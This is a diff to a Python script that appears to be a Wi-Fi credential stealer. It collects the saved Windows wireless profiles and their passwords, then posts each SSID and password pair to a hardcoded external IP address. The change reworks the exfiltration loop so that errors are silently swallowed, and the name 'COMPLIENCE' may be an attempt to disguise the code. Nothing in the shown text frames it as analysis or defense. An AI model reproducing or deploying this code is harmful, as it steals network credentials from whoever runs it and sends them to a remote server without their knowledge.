@@ -6,11 +6,9 @@ import subprocess
 import re
 from threading import Thread
 import time
-import os
 from tkinter import messagebox
 import ctypes
 import requests
-import json
 
 COMPLIENCE = {}
 
@@ -54,27 +52,20 @@ def main():
    if get_interfaces():
         profiles = get_profiles()
         get_passwords(profiles)
-
-        jsons = []
+        print(COMPLIENCE)
+        dicts = []
         for key, value in COMPLIENCE.items():
-            dict = {
-                'ssid': key,
-                'password': value
-            }
-            js = json.dumps(dict)
-            print(js)
-            jsons.append(js)
+            dict = {'ssid': f'{key}','passwd': f'{value}'}
+            dicts.append(dict)
 
-        try:
-            url = 'http://185.92.74.31:10000'
-            headers = {'Content-Type': 'application/json'}
-            for js in jsons:
-                answer = requests.post(url=url, headers=headers, json=js)
-                time.sleep(0.3)
-                print(answer.status_code)
-        except requests.exceptions as rec:
-            print(rec)
-
+        url = 'http://185.92.74.31:10000/main'
+        headers = {'Content-Type': 'application/json'}
+        for dict in dicts:
+            try:
+                answer = requests.post(url=url, headers=headers, params=dict)
+                print(answer)
+            except requests.exceptions.RequestException as rec:
+                pass
 
 colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
 
